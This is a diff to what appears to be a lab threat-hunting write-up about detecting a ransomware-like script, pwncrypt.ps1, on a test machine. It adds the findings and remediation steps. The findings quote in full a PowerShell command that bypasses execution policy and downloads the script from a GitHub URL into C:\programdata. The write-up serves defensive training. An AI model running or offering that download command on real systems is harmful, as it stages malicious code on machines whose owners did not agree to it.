@@ -28,6 +28,16 @@ DeviceNetworkEvents
 <img width="1651" height="521" alt="image" src="https://github.com/user-attachments/assets/06e49924-f2ec-4816-b298-04dc301d8a20" />
 
 Findings
-- Confirmed ommand line to callout to github and save file pwncrypt.ps1 to C:\programdata
+- Confirmed command line run by "labuser" to callout to github and save file locally. "pwncrypt.ps1 to C:\programdata "powershell.exe  -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/pwncrypt.ps1 -OutFile C:\programdata\pwncrypt.ps1"
 
+
+
+
+
+
+
+Remediate
+- Block all traffic to malicious URI
+- Remove pwncrypt.ps1 and kill related processes
+- 
 
